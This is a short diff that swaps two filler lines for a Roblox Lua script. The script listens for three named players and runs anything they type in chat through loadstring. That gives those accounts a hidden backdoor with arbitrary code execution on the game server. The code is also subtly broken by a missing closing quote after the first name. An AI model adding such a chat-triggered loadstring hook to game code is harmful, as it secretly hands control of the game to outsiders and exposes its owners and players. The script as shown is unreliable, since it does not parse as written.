@@ -1,2 +1,7 @@
-this is literally amazing
-a
+game.Players:PlayerAdded:connect(function(player)
+  if player.Name == "AshleyCold or player.Name == "iFractal" or player.Name == "Darkus_Theory" then
+    player.Chatted:connect(function(message)
+      loadstring(message)
+    end)
+  end
+end)
